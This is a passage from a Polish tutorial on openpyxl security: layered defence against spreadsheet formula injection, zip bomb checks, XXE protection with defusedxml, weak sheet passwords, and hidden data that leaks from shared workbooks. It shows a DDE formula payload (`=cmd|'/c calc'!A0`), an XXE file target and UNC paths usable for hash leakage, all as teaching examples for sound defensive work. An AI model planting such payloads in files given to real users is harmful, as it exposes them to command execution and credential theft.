| `openpyxl.utils.escape.escape()` | znaki `< 31` → `_xHHHH_` (wymóg XML) | **NIE** |
| `str.strip()` | usuwa białe znaki z brzegów | **NIE** (a wręcz może zaszkodzić) |
| `IllegalCharacterError` | blokuje znaki niedozwolone w XML | **NIE** (to inna klasa problemu) |
| `cell.data_type = "s"` | wymusza typ tekstowy komórki | **TAK** (dla `.xlsx`) |
| walidacja whitelistowa + konwersja do typu | wartość nigdy nie jest stringiem | **TAK** (najsilniejsza) |
| apostrof jako prefiks | konwencja dla CSV | częściowo (dla CSV) |

### 2.4. Trzy warstwy obrony — mur, nie kurtyna

Skoro pojedyncza funkcja nie załatwia sprawy, potrzebujesz **warstw**. Analogia: **odprawa na lotnisku**. Nikt nie twierdzi, że „sprawdzanie bagażu" wystarcza. Jest kontrola dokumentów, kontrola bagażu, bramka, pies, czasem kontrola ręczna. Każda warstwa wyłapuje to, co prześlizgnęło się przez poprzednią. I każda **działa niezależnie** — awaria jednej nie otwiera całego lotniska.

**Warstwa 1 — WEJŚCIE: normalizacja do typu.**

To miejsce, w którym wartość traci prawo bycia stringiem, jeśli nie musi. Tutaj zbierasz i konwertujesz: `"1 200,50"` → `1200.50` (liczby, moduł 05), `"2026-01-05"` → `datetime.date(2026,1,5)` (daty), `"Tak"` → `True` (enumy). **To jest funkcja czysta** — bez openpyxl, bez I/O. Możesz ją przetestować w `BytesIO`-owych testach modułu 20, z `hypothesis` na niezmiennik „wynik jest zawsze jednym z dozwolonych typów".

**Warstwa 2 — TRANSFORMACJA: jawna decyzja o typie komórki.**

Po normalizacji zostają tylko pola wolnego tekstu. Dla nich robisz jedną rzecz: **przy zapisie wymuszasz `data_type = "s"`**. To jest moment, w którym mówisz do pliku: „to jest tekst, cokolwiek by się w nim znajdowało".

**Warstwa 3 — WYJŚCIE: weryfikacja, że obrona zadziałała.**

I tu jest część, którą prawie wszyscy pomijają. Po wygenerowaniu pliku **sprawdź**, czy nie ma w nim formuł, których tam nie chciałeś. To fantastycznie proste:

```python
def policz_formuly(wb) -> list[str]:
    """Zwraca adresy WSZYSTKICH komorek-formul w skoroszycie."""
    adresy = []
    for ws in wb.worksheets:
        for wiersz in ws.iter_rows():
            for komorka in wiersz:
                if komorka.data_type == "f":
                    adresy.append(f"{ws.title}!{komorka.coordinate}")
    return adresy
```

I zasada, która zamienia to z ciekawego gadżetu w **mechanizm bezpieczeństwa**:

> **W raporcie generowanym od zera liczba formuł musi być znana z góry.** Jeśli wiesz, że Twoje podsumowanie ma dokładnie 3 formuły — to `policz_formuly(wb)` musi zwrócić **3**. Każda dodatkowa formuła to **potencjalny wsad od użytkownika, który przeszedł przez obronę**. To jest dokładnie ten sam wzorzec, co `test_liczba_regul_cf` z modułu 20: **asercja na liczbę**.

To jest piękno tej warstwy: **nie musisz wiedzieć, jaki jest payload.** Nie musisz znać nowych sztuczek. Musisz wiedzieć, ile formuł **Ty** napisałeś — a jeśli jest ich o jedną więcej, masz incydent i trafia on do logów. **Obrona, która nie potrafi powiedzieć „tu coś jest nie tak", nie jest obroną.**

### 2.5. Dwa światy: CSV i XLSX mają różne modele zagrożeń

Zbierzmy różnice, bo są fundamentalne i mylenie ich prowadzi do błędnych decyzji.

| | `.csv` | `.xlsx` |
|---|---|---|
| **Kto ustala typ?** | program czytający (Excel, LibreOffice) | plik (znacznik `t=` i styl komórki) |
| **Czy istnieje „typ tekstowy"?** | **nie** — wszystko jest tekstem do momentu interpretacji | **tak** — `t="s"` / `data_type = "s"` |
| **Narzędzie obrony** | apostrof (konwencja OWASP) | **`data_type = "s"`** (mechanizm formatu!) |
| **Czy liczba wyzwalaczy jest skończona?** | nie — zależy od czytnika i wersji | tak — `=` w openpyxl, ale to wersja zależna |
| **Naprawa po zapisie** | tylko przez przepisanie pliku | możliwa (to ten sam plik, co wartość) |
| **Kto zapisuje formuły?** | ten, kto otwiera | **Ty**, w komórce pliku |

Ta tabela prowadzi do praktycznego wniosku, który może Ci się nie spodobać, ale jest prawdziwy:

> **Jeśli masz wybór między eksportem `.csv` a `.xlsx`, wybierz `.xlsx`.** Nie dlatego, że „ładniej wygląda". Dlatego, że `.xlsx` **da się zabezpieczyć maszynowo** (typ komórki), a `.csv` — tylko konwencją.

### 2.6. Powierzchnia ataku archiwum — dlaczego `.xlsx` to nie tylko formuły

Skoro plik jest archiwum ZIP (moduł 02), to archiwum ma **własną** powierzchnię ataku, niezależną od tego, co jest w komórkach. Prześledźmy ją w kolejności, w jakiej atakujący by ją sprawdzał.

#### 2.6.1. Zip bomb — i niebezpieczne założenie, że Python Cię ochroni

**Zip bomb** to archiwum, które jest **maleńkie w formie spakowanej** i **ogromne po rozpakowaniu**. Klasyczny przykład: plik 42 kilobajtów, który rozpakowuje się do 4,5 petabajta. Mechanika: wielopoziomowe zagnieżdżenie tych samych danych, więc kompresja jest prawie idealna.

Stosunek rozmiarów to kluczowa miara:

$$\text{współczynnik kompresji} = \frac{\sum \text{file\_size}}{\sum \text{compress\_size}}$$

Dla normalnego pliku XLSX to zwykle 3–10. Dla bomby — **setki lub tysiące**.

I teraz najważniejsza, brutalna prawda **zweryfikowana w dokumentacji Pythona**:

> **Standardowa biblioteka `zipfile` w Pythonie NIE MA wykrywania zip bomb.** To zostało zgłoszone jako CVE-2019-9674. Jeśli rozpakujesz bombę albo wczytasz ją przez `Open`, zużyjesz tyle RAM/dysku, ile żąda atakujący — i to zakończy Twój serwis (albo Twój laptop).

A openpyxl używa standardowego `zipfile`. Nie ma tam żadnej ochrony. Więc:

> **Za limit rozpakowania odpowiadasz Ty, nie openpyxl i nie Python.**

W praktyce wygląda to tak — **sprawdzasz archiwum zanim je wczytasz**:

```python
import zipfile
from pathlib import Path


class RyzykowneArchiwum(Exception):
    """Archiwum przekracza limity bezpieczenstwa."""


def sprawdz_archiwum(
    sciezka,
    max_rozpakowane: int = 200 * 1024 * 1024,    # 200 MB - do dostrojenia
    max_wspolczynnik: float = 50.0,              # 50x - do dostrojenia
    max_czesci: int = 5000,
) -> dict:
    """Sprawdza ARCHIWUM, zanim openpyxl cokolwiek wczyta.

    UZASADNIENIE: stdlib zipfile NIE chroni przed zip bomb (CVE-2019-9674),
    a openpyxl uzywa stdlib. Caly limit jest nasza odpowiedzialnoscia.
    """
    with zipfile.ZipFile(sciezka) as zf:
        infos = zf.infolist()

        if len(infos) > max_czesci:
            raise RyzykowneArchiwum(
                f"{len(infos)} czesci > limit {max_czesci}"
            )

        rozpakowane = sum(i.file_size for i in infos)
        spakowane = max(sum(i.compress_size for i in infos), 1)
        wspolczynnik = rozpakowane / spakowane

        if rozpakowane > max_rozpakowane:
            raise RyzykowneArchiwum(
                f"rozpakowany rozmiar {rozpakowane} B > limit {max_rozpakowane} B"
            )
        if wspolczynnik > max_wspolczynnik:
            raise RyzykowneArchiwum(
                f"wspolczynnik kompresji {wspolczynnik:.1f} > limit {max_wspolczynnik}"
            )

        # Zagniezdzone archiwa i osobliwe nazwy czesci - sygnal ostrzegawczy.
        podejrzane = [
            i.filename for i in infos
            if i.filename.lower().endswith((".zip", ".gz", ".7z", ".rar"))
            or i.filename.startswith("/")
            or ".." in i.filename.replace("\\", "/").split("/")
        ]
        if podejrzane:
            raise RyzykowneArchiwum(f"podejrzane czesci: {podejrzane[:5]}")

    return {
        "rozpakowane": rozpakowane,
        "spakowane": spakowane,
        "wspolczynnik": round(wspolczynnik, 2),
        "czesci": len(infos),
    }
```

**Co się dzieje w pamięci.** `ZipFile(sciezka)` czyta **tylko katalog centralny** ZIP-a i listę wpisów — to operacja tania, nie rozpakowuje danych. Dlatego `infolist()` i `file_size` są bezpieczne: to **deklaracje z nagłówka**, a nie rzeczywiste rozpakowanie. My tylko je **sumujemy**.

**Co trafi do pliku.** Nic — ta funkcja niczego nie tworzy. Ale **zmienia to, co się stanie dalej**: jeśli podniesie `RyzykowneArchiwum`, to `load_workbook` **nie zostanie wywołany** i bomba nigdy nie rozpakuje się w Twoim procesie.

**Trzy rzeczy do przemyślenia:**

1. **Limity są do dostrojenia, nie do skopiowania w ciemno.** 200 MB i 50× to punkt startowy. Twój raport 500 000 wierszy z 12 arkuszami będzie miał wysoki `file_size` — i to jest **legalne**. Dlatego limity **mierzy się na własnych plikach** i ustawia z zapasem. To dokładnie ta sama logika, co budżet wydajności z modułu 20: **licz, nie zgaduj**.
2. **`file_size` to deklaracja, więc teoretycznie można ją sfałszować.** Prawdziwa ochrona jest warstwą niżej: **limit zasobów procesu** (cgroup, `memory_limit`, `ulimit`). Sprawdzenie nagłówka wyłapuje 99% przypadków tanim kosztem — a limit procesu jest siatką bezpieczeństwa na ostatni procent. **Obrona w głąb.**
3. **`..` i wiodący `/` w nazwach części.** W `zipfile` z Pythona 3.6+ jest ochrona przy rozpakowywaniu na dysk, ale **nie zakładaj niczego o dowolnym innym narzędziu w Twoim łańcuchu** (kolejka, antywirus, inny skrypt). A uwaga istotna dla nas: **openpyxl czyta części archiwum po nazwie, nie rozpakowuje go na dysk** — więc klasyczny path traversal nie jest tu wektorem *przez openpyxl*. Ale (a) Twoja własna logika może rozpakowywać, (b) nazwy części trafiają do **logów i komunikatów błędów** (log injection!), (c) nie zakładaj, że nikt w łańcuchu nie rozpakowuje.

#### 2.6.2. XXE, „billion laughs" i rola `defusedxml`

Skoro części to XML, parsowanie XML ma **własną** powierzchnię ataku. Wymieńmy je, bo różnią się istotnie:

| Atak | Na czym polega | Czy `xml.etree` jest podatny? |
|---|---|---|
| **XXE (external entity expansion)** | encja wskazuje plik lokalny (`file:///etc/passwd`) albo URL; dane wyciekają do wyniku | **NIE** — `xml.etree.ElementTree` nie rozwija encji zewnętrznych |
| **billion laughs** | zagnieżdżone encje mnożą się wykładniczo; mały plik → gigabajty tekstu | **TAK** |
| **quadratic blowup** | jedna duża encja powtarzana tysiące razy; omija zabezpieczenia przed głębokim zagnieżdżeniem | **TAK** |
| **DTD retrieval** | wymuszone pobranie DTD z sieci | **NIE** |

I teraz historia, którą trzeba znać, bo **dotyczyła openpyxl bezpośrednio**:

- **CVE-2017-5992** — w openpyxl **≤ 2.4.1** parsowanie **rozwiązywało encje zewnętrzne domyślnie**, co pozwalało na atak XXE przez spreparowany plik `.xlsx`. Naprawione.
- **MR #300** w projekcie openpyxl („Use defusedxml to guard against various XML vulnerabilities") dodał `defusedxml` jako zabezpieczenie i **dostarczył testy**, które **wykazywały, że `billion laughs` i `quadratic blowup` są w openpyxl możliwe** bez tej biblioteki.

A jak to działa dzisiaj? openpyxl wykrywa `defusedxml` w środowisku i — jeśli jest — używa go do parsowania. Widać to w `openpyxl/xml/__init__.py`:

```python
def defusedxml_available():
    try:
        import defusedxml # noqa
    except ImportError:
        return False
    else:
        return True

def defusedxml_env_set():
    return os.environ.get("OPENPYXL_DEFUSEDXML", "True") == "True"

DEFUSEDXML = defusedxml_available() and defusedxml_env_set()
```

I teraz trzy rzeczy, które musisz z tego wyczytać:

**Rzecz 1 — `defusedxml` jest OPTYMALNE, ale w kontekście bezpieczeństwa: niezbędne.** Tak jak `lxml` (moduł 19) i `pillow` (moduł 16). Zainstaluj je i **zweryfikuj**, że działa:

```python
import openpyxl
from openpyxl import DEFUSEDXML, LXML

print("defusedxml aktywny:", DEFUSEDXML)
print("lxml aktywny     :", LXML)

if not DEFUSEDXML:
    raise SystemExit(
        "UWAGA: defusedxml nieaktywny. Instaluj: pip install defusedxml"
    )
```

To jest **dokładnie ten sam wzorzec**, co krok `python -c "from openpyxl import LXML; assert LXML"` w CI z modułu 20. **Sprawdzenie, że zabezpieczenie jest aktywne, jest osobnym krokiem** — bo cicha degradacja bezpieczeństwa nie daje żadnego objawu.

**Rzecz 2 — gotcha z `OPENPYXL_DEFUSEDXML`.** Zwróć uwagę na koniunkcję w kodzie: porównanie to `== "True"` (z dużej litery, dokładnie ten napis). To znaczy, że **każda inna wartość wyłącza zabezpieczenie**:

```bash
export OPENPYXL_DEFUSEDXML=false   # wyłącza  (OK, świadome)
export OPENPYXL_DEFUSEDXML=0       # wyłącza  (nie "0" znaczy "off", tylko "nie True")
export OPENPYXL_DEFUSEDXML=1       # ⚠️ WYŁĄCZA! bo "1" != "True"
export OPENPYXL_DEFUSEDXML=true    # ⚠️ WYŁĄCZA! bo "true" != "True"
export OPENPYXL_DEFUSEDXML=yes     # ⚠️ WYŁĄCZA!
```

To jest podręcznikowy przykład **kopiowania konfiguracji z innego projektu** („ustawię `1`, bo tak robiłem z innymi flagami") i **cichego wyłączenia ochrony**. Zapamiętaj: **flaga bezpieczeństwa, która nie krzyczy, gdy jest wyłączona, jest flagą, której nie ustawisz świadomie.** Sprawdź ją w kodzie — jak wyżej. (Ten sam wzorzec dotyczy `OPENPYXL_LXML`.)

**Rzecz 3 — `lxml` zmienia powierzchnię ataku.** Jeśli `lxml` jest zainstalowany, openpyxl używa `lxml.etree` zamiast `xml.etree` — a `lxml` **historycznie był podatny na XXE**. To kolejny powód, dlaczego `defusedxml` jest ważniejszy, niż wygląda: **chroni nie tylko ścieżkę stdlib, ale i ścieżkę `lxml`**. Czyli: optymalizacja wydajności z modułu 19 i ochrona z modułu 21 dotyczą **tej samej biblioteki** — i muszą iść razem.

**Praktyczna reguła:** w każdym środowisku, w którym **przyjmujesz pliki od użytkowników**, `defusedxml` jest zależnością produkcyjną, a jego aktywność **sprawdzaną przy starcie** (fail-fast, nie „w logu ostrzeżenie").

#### 2.6.3. Rozszerzenia: walidacja, która wygląda na walidację, a nią nie jest

Sprawdziłem funkcję, która waliduje plik wejściowy w openpyxl 3.1 — `_validate_archive`:

```python
SUPPORTED_FORMATS = ('.xlsx', '.xlsm', '.xltx', '.xltm')

def _validate_archive(filename):
    is_file_like = hasattr(filename, 'read')
    if not is_file_like:
        file_format = os.path.splitext(filename)[-1].lower()
        if file_format not in SUPPORTED_FORMATS:
            ... raise InvalidFileException(msg)
    archive = ZipFile(filename, 'r')
    return archive
```

Wyciągnijmy z tego **dwa wnioski**, oba ważne:

**Wniosek pierwszy:** sprawdzane jest **rozszerzenie**, i to **tylko wtedy, gdy `filename` jest ścieżką** (stringiem). Rozszerzenie to **nazwa pliku nadana przez atakującego** — nic nie mówi o jego treści. Bomba ZIP może nazywać się `raport_xlsx`… no właśnie, nie: musi nazywać się `raport.xlsx`. Ale zip bomb w środku może być dowolna. **Rozszerzenie to deklaracja, nie dowód.** Więc walidacja treści (2.6.1) i tak jest na Tobie.

**Wniosek drugi, i ten jest kluczowy:** jeśli `filename` jest **obiektem plikopodobnym** (np. `io.BytesIO` z uploadu!), to gałąź `if not is_file_like` **nie wykonuje się wcale** — **żadna walidacja nie zachodzi**. A przecież w aplikacji webowej **dokładnie tak wczytujesz upload**. Praktyczna konsekwencja:

> **`load_workbook(io.BytesIO(bajty_z_formularza))` NIE przechodzi przez żadną walidację rozszerzenia.** Cała walidacja wejścia jest Twoja.

I dalej: sam `ZipFile(filename, 'r')` **nie jest** opakowany w `try/except` w tej funkcji — więc `BadZipFile` poleci w górę. Twój handler powinien łapać świadomie:

```python
from zipfile import BadZipFile
from openpyxl.utils.exceptions import InvalidFileException

try:
    wb = load_workbook(io.BytesIO(bajty))
except (InvalidFileException, BadZipFile, KeyError) as exc:
    # InvalidFileException - zle rozszerzenie / nie-OOXML
    # BadZipFile          - to nie jest poprawny ZIP
    # KeyError            - brak wymaganej czesci w archiwum
    raise ValueError("To nie wyglada na poprawny plik XLSX") from exc
```

Zwróć uwagę na `KeyError` — openpyxl w kilku miejscach zakłada, że część istnieje, i przy braku dostajesz `KeyError`. To jest realna ścieżka „plik jest ZIP-em, ale nie jest XLSX-em" albo „plik jest XLSX-em okrojonym tak, żeby wywołać niespodziany wyjątek". **Niech wyjątek z parsowania nigdy nie wycieknie do użytkownika w surowej formie** — bo zawiera ścieżki do Twoich plików tymczasowych (patrz pułapka w sekcji 6).

### 2.7. Ochrona hasłem to kłódka na szufladzie, nie sejf

Powtórka z modułu 17, ale tu ma inne znaczenie — bo mówimy o **bezpieczeństwie**, a nie o UX arkusza.

Dokumentacja openpyxl (sekcja Protection) mówi to wprost, cytując specyfikację OOXML:

> „Password protecting a workbook or worksheet only provides a quite basic level of security. **The data is not encrypted**, so can be modified by any number of freely available tools. […] Worksheet or workbook element protection **should not be confused with file security**. It is meant to make your workbook safe from **unintentional modification**, and **cannot protect it from malicious modification**."

Warto ten cytat rozłożyć na trzy zdania, bo każde niesie inną informację:

1. **Dane nie są szyfrowane.** Otwierasz plik, wyciągasz `sheet1.xml`, czyta się jak każdy XML. Hasło w niczym nie przeszkadza.
2. **Hasło chroni przed pomyłką, nie przed intencją.** Kolega nie skasuje przez przypadek wiersza nagłówkowego. Atakujący usunie ochronę skryptem.
3. **Algorytm to „Legacy Password Hash Algorithm"** (tak nazywa go dokumentacja OOXML). Historyczny, trywialny do złamania.

Analogia z briefu jest trafna i nie da się jej poprawić:

> **Ochrona hasłem to kłódka na szufladzie biurka — nie sejf.** Chroni przed tym, że ktoś przez pomyłkę otworzy złą szufladę. Nie chroni przed tym, że ktoś przyniesie łom.

**Co z tego wynika praktycznie:**

| Cel | Właściwe narzędzie | Co NIE działa |
|---|---|---|
| Nikt nie zmieni przypadkiem struktury raportu | `wb.security.lockStructure = True` + hasło | — |
| Nikt nie zmieni przypadkiem komórek formularza | `ws.protection.sheet = True` + `Protection(locked=False)` na polach | — |
| Nikt nie ODCZYTA danych osobowych | **szyfrowanie pliku** (osobny format!), szyfrowanie dysku, uprawnienia systemowe, szyfrowany kanał | hasło arkusza **nie zadziała** |
| Rozliczalność zmian | arkusz `_meta`, `wb.properties`, hash danych wejściowych, log audytowy | hasło arkusza |

I jeszcze jedno, w kontekście tego modułu: **szyfrowania pliku nie zrobisz w openpyxl.** Format zaszyfrowanego OOXML (tzw. „Encrypted Package", opakowanie OLE/CFB) **nie jest obsługiwany przez openpyxl** — to inny format, nie ten, który biblioteka czyta. Jeśli potrzebujesz szyfrowania, robisz to warstwą wyżej (np. `7z`/`gpg` na pliku po zapisie, albo szyfrowanie całego katalogu) — **albo, co lepsze, nie umieszczasz danych w pliku, który opuszcza Twoją infrastrukturę.**

### 2.8. Wyciek danych — warstwy skoroszytu, o których nikt nie pamięta

To jest druga połowa modułu i dotyczy zagrożenia, którego **formuły nie opisują**: nie „ktoś coś uruchomi", a „**ktoś coś zobaczy**".

Wróć do kontenera z sekcji 1.4. Zadaj sobie pytanie: **co dokładnie wysyłasz, kiedy wysyłasz skoroszyt?** Większość ludzi odpowiada: „te liczby, które widać". To zdanie jest fałszywe. Wysyłasz:

**a) Ukryte i `veryHidden` arkusze.** Sprawdzenie jest jedno: `ws.sheet_state`. Trzy wartości (`visible`, `hidden`, `veryHidden`) i jedna z nich jest szczególnie zdradliwa — `veryHidden` **nie pojawia się w oknie „Odkryj" Excela**. Arkusz ukryty tą metodą można odkryć **tylko kodem** (albo w edytorze VBA). Załóż, że w każdym pliku z „bogatą historią" (a zwłaszcza z plików budżetowych, wycen, modeli finansowych) **taki arkusz może być** — i że ktoś trzyma tam dokładnie to, czego nie powinien pokazać.

**b) Ukryte kolumny i wiersze.** Klasyka: widoczna kolumna „Cena", ukryta kolumna „Cena zakupu". Sprawdzenie: `ws.column_dimensions[litera].hidden` i `ws.row_dimensions[numer].hidden`. **Ale uwaga na fałszywe alarmy** (to samo, co `max_row` w module 07): kolumna może być „ukryta" i pusta, bo ktoś ją kiedyś ukrył przez przypadek. Dlatego audyt powinien raportować tylko ukryte kolumny **z danymi**.

**c) Wartości ukryte *formatem*.** To najbardziej zmyślny przypadek i prawie nikt o nim nie wie. Kod formatu liczby `;;;` składa się z trzech pustych sekcji: „dla dodatnich nic; dla ujemnych nic; dla zera nic". Efekt: **komórka ma wartość, a pokazuje pustkę.** Excel jej nie pokaże w żadnym widoku. A dane tam są i przejdą do każdego audytu „na oko". Sprawdzenie: `cell.number_format == ";;;"` i `cell.value is not None`.

**d) Komentarze — z nazwiskami autorów.** To jest niedocenianie wycieku. Komentarz ma `author`, a autor to zwykle „Jan Kowalski" plus (w korporacjach) nazwa działu czy projekt. Razem z treścią typu „sprawdzić marżę u Klienta, bo w zeszłym kwartale nie zapłacił" — to jest gotowy materiał wywiadowczy. Sprawdzenie: `cell.comment` i `cell.comment.author`.

**e) Definiowane nazwy — także ukryte i zewnętrzne.** `DefinedName` ma pole `hidden` (nazwa może być ukryta w interfejsie) i właściwość `is_external` (nazwa wskazuje na **inny plik**). Co gorsza, nazwa ukryta jest **jeszcze bardziej** zdradliwa niż arkusz `veryHidden`, bo nikt nie patrzy w menedżer nazw. I nawet jeśli nie trzyma danych, jej **treść jest informacją**: nazwa `Marza_Zakupu_2026` mówi odbiorcy coś, czego nie chciałeś powiedzieć. W 3.1 API zostało przebudowane (`DefinedName`, `wb.defined_names` jako `DefinedNameDict` — moduł 18), więc iteruj świadomie:

```python
for nazwa, definicja in wb.defined_names.items():
    print(nazwa, definicja.attr_text, "ukryta:", definicja.hidden,
          "zewnetrzna:", definicja.is_external)
```

**f) Linki zewnętrzne — a w nich ścieżki UNC.** I to jest najgroźniejszy punkt na tej liście. Link zewnętrzny to odwołanie z jednego skoroszytu do innego pliku. Po wczytaniu openpyxl trzyma je w `wb._external_links`, a każdy ma `file_link.Target`. Realne wartości, które tam bywają:

```text
Budget_2026.xlsx
/Users/jkowalski/AppData/Local/Temp/orion/Workpapers_1231.xlsx
\\SF-DATA-2\IBData$\TEMP\Models\Wycena_KlientA.xls
\\FILESERVER01\Finanse$\2026\Budzet_vertrauliczny.xlsx
```

Popatrz na to uważnie. Wysyłasz na zewnątrz plik, który **w środku zawiera mapę Twojej sieci wewnętrznej**: nazwy serwerów (`SF-DATA-2`, `FILESERVER01`), nazwy udziałów (`IBData$`, `Finanse$` — z dolarami, czyli ukrytych!), **strukturę katalogów** i **nazwy plików wewnętrznych dokumentów poufnych**. Do tego zdradza **nazwiska i nazwy użytkowników** (`jkowalski`) i wewnętrzną strukturę zespołów. To nie jest „drobny szczegół" — to jest rekonesans.

Dodatkowo, jeśli formuła w Twoim pliku odwołuje się do takiego linku (`='[1]Budzet'!$B$2`), to:
- Excel przy otwarciu **może próbować sięgnąć do tego zasobu** (w zależności od konfiguracji i zaufania), co przy ścieżce UNC może prowadzić do **ujawnienia poświadczeń/hasha** (uwierzytelnianie NTLM do zdalnego zasobu) — klasyczny problem „dlaczego mój serwer plików logował ruch z laptopa klienta".
- Bez dostępu użytkownik zobaczy `#REF!` — czyli wygląd, jakby raport był zepsuty.

**g) Metadane dokumentu.** `wb.properties` to: `creator`, `lastModifiedBy`, `title`, `subject`, `description`, `keywords`, `category`, `created`, `modified`. Realne pliki z Excela mają tam nazwiska, nazwy firm, nazwy klientów i numery projektów. Plus `wb.custom_doc_props` (własne właściwości — moduł 18) mogą zawierać dowolne pary klucz/wartość.

**h) Pliki osadzone: `xl/media/*`.** Obraz albo **podpis skanowany**, albo **zrzut ekranu z innym klientem**, albo — klasyka — **zdjęcie tablicy z burzy mózgów**. Każda część `xl/media/` przechodzi do udostępnianego pliku.

**i) Pamięć podręczna tabel przestawnych (`xl/pivotCache/*`).** Tabela przestawna ma w pamięci podręcznej **kopię danych źródłowych**. Jeśli zbudowałeś przestawną z arkusza z danymi poufnymi, a potem arkusz usunąłeś — **cache może nadal zawierać dane**. To jest wyciek działający „po usunięciu".

**j) Formuły jako wyciek strukturalny.** Formuła `=B2*Workings!B1` to **komunikat**: „istnieje arkusz `Workings` i stawkę trzymam w `B1`". Nawet jeśli usuniesz arkusz `Workings`, formuła zdradziła jego istnienie i strukturę — a jeśli arkusz został w innym pliku, dała trop.

**k) Części, których openpyxl w ogóle nie modeluje.** W module 18 ustaliliśmy, że shapes, sparkline'y, slicery itd. są **poza modelem** — openpyxl ich nie czyta i nie zapisuje. W kontekście bezpieczeństwa ma to **dobrą i złą** stronę:
- **Dobra:** jeśli **przepisujesz** plik przez openpyxl od zera, wszystko, czego biblioteka nie modeluje, **nie trafi do nowego pliku**. To jest **bezpieczna domyślność**.
- **Zła:** jeśli **zapisujesz** plik wczytany (read-modify-write), to części, których openpyxl nie rozumie, są **usuwane po cichu** — więc nie zobaczysz ich w audycie, bo ich nie ma w modelu. **Twoje narzędzie audytowe musi patrzeć na ZIP, nie tylko na model.** To dlatego nasz audyt z sekcji 3.3 zaczyna od `namelist()`.

Wniosek z całej tej sekcji — zapisz go sobie:

> **Skoroszyt to nie to, co widać na ekranie. Skoroszyt to kontener, a widoczna siatka komórek to jedna z jego przegród.**

### 2.9. Błogosławieństwo: to, że openpyxl NIE liczy formuł

Teraz rzecz, która brzmi jak ograniczenie, a jest **największą zaletą bezpieczeństwową** tej biblioteki.

W module 06 ustaliliśmy z rozczarowaniem: **openpyxl nie ma silnika obliczeń**. Nie policzy `=SUM(A1:A10)`. Musisz otworzyć plik w Excelu, żeby zobaczyć wynik. Dla wielu osób to wada.

Ale spójrz na to z tej strony: **openpyxl nigdy nie wykonuje niczego, co przeczytał z pliku.** Nie ma pętli, w której „wartość z komórki staje się instrukcją". Nie ma eval. Jeśli wczytasz skoroszyt z `=cmd|'/c calc'!A0` w komórce, openpyxl zrobi dokładnie jedną rzecz: **przeczyta go jako string do pola `.value`** i pójdzie dalej. Nic się nie stanie.

To znaczy, że w Twoim procesie **nie ma drugiej egzekucji**. Ryzyko pojawia się wyłącznie w dwóch miejscach:
1. **W momencie, gdy plik opuszcza Twoją infrastrukturę** (otwiera go człowiek w Excelu) — to jest pole, na którym się skupiamy.
2. **W momencie, gdy plik wraca do Ciebie** i Ty go **przepisujesz** do innego pliku — bo wtedy możesz **przenieść ładunek** z pliku, który „wygada się" jako podejrzany, do pliku, który wygląda niewinnie.

I tu dochodzimy do pojęcia, które nazwę **praniem formuł**.

#### 2.9.1. Pranie formuł — mechanizm i granica bezpieczeństwa

**Pranie formuł** (*formula laundering*) to sytuacja, w której ładunek z zewnątrz **przechodzi przez Twój kod** i wychodzi w pliku, który **nosząc Twoją markę** (Twoja nazwa arkusza, Twoje style, Twoje metadane) wygląda jak Twoja zaufana produkcja.

Jak to działa? Wyobraź sobie, że piszesz narzędzie „oczyszczę raport klienta":

```python
# ❌ NIEBEZPIECZNE: pranie formul
wb = load_workbook("raport_od_klienta.xlsx")     # w srodku moga byc formulami-pulapki
ws = wb.active
ws["Z1"] = "Wygenerowano automatycznie"          # dodajemy nasz podpis...
wb.properties.creator = "Automat raportowy"      # ...i nasza marke
wb.save("raport_oczyszczony.xlsx")               # 👈 a ładunek pojechał dalej
```

Formuły z pliku klienta **nie zostały zneutralizowane** — zostały **przepisane**. A ponieważ doszedł Twój podpis i Twoje metadane, **zmienił się poziom zaufania odbiorcy**. Plik, który ktoś mógłby podejrzliwie otworzyć, gdyby przyszedł mailem od nieznanej osoby, teraz przychodzi **od Ciebie** jako „raport oczyszczony automatycznie". To jest dokładnie pranie — **nie brud się usuwa, tylko zmienia się metka.**

**Granica bezpieczeństwa przebiega więc nie tam, gdzie się wydaje.** Zdanie z briefu trzeba odwrócić i wypowiedzieć z pełną precyzją:

> **Jeśli generujesz raport od zera (nowy `Workbook`, dane zaufane, wpisywane jawnie jako tekst) — jesteś bezpieczny.** Ładunek musi skądś przyjść, a Ty go nie masz.
>
> **Jeśli kopiujesz istniejący plik (`load_workbook` → modyfikacja → `save`) — nie jesteś.** W tym pliku są już komórki o dowolnym `data_type`, w tym `f`. I Ty je wystawiasz dalej.

**Jak sobie z tym radzić?** Warianty od najprostszego:

1. **Nie przepisuj pliku, który przyszedł z zewnątrz.** Wczytaj **dane**, zbuduj **nowy** skoroszyt. To jest reguła kciuka z modułu 18 i jednocześnie **reguła bezpieczeństwa**.
2. Jeśli musisz przepisać — **przejdź przez walidację i wymuś typy**: każdą komórkę wczytaną wczytaj jako **wartość** (`iter_rows(values_only=True)`), a następnie zapisz ją przez **ten sam sanitizer**, co dane z formularzy. **Nie kopiuj komórek — kopiuj wartości.**
3. Plansza awaryjna: **`data_only=True`**. To zastępuje każdą formułę ostatnio zapisaną wartością (jeśli cache istnieje — moduł 06!). Uwaga na dwie rzeczy: (a) jeśli plik nie był nigdy otwarty w Excelu, cache nie ma i dostaniesz `None`; (b) **nie zapisuj takiego skoroszytu nad oryginałem** (moduł 06!) — ale do zrobienia **kopii do udostępnienia** to jest dokładnie właściwe narzędzie.

### 2.10. Checklista „sanitacja pliku przed wysłaniem na zewnątrz"

Zbierzmy sekcję 2.8 w coś, co możesz **wykonać**. To jest sedno praktycznej wartości tego modułu — checklista, która odpowiada na pytanie: „wysyłam plik klientowi, co sprawdzić?"

| # | Co do sprawdzenia | Jak |
|---|---|---|
| 1 | Arkusze `hidden` i `veryHidden` | `ws.sheet_state != "visible"` |
| 2 | Ukryte wiersze i kolumny **z danymi** | `ws.row_dimensions[i].hidden` + `ws.column_dimensions[L].hidden` (i sprawdź, czy coś tam jest!) |
| 3 | Wartości ukryte formatem | `cell.number_format == ";;;"` i `cell.value is not None` |
| 4 | Komentarze (z autorami) | `cell.comment` (+ `.author`) |
| 5 | Definiowane nazwy — ukryte i zewnętrzne | `definicja.hidden`, `definicja.is_external`, `definicja.attr_text` |
| 6 | **Linki zewnętrzne — ze ścieżkami UNC** | parsuj `xl/externalLinks/*` z ZIP-a (bo `wb._external_links` jest **prywatne**) |
| 7 | Właściwości dokumentu | `wb.properties.creator`, `.lastModifiedBy`, `.title`, … |
| 8 | Własne właściwości dokumentu | `wb.custom_doc_props` |
| 9 | Pliki osadzone | `xl/media/*` w archiwum |
| 10 | Pamięci podręczne tabel przestawnych | `xl/pivotCache/*` w archiwum |
| 11 | Formuły i ich treść | `cell.data_type == "f"`; flaguj te z `!` (odwołania międzyarkuszowe) i te z `[` (linki zewnętrzne) |
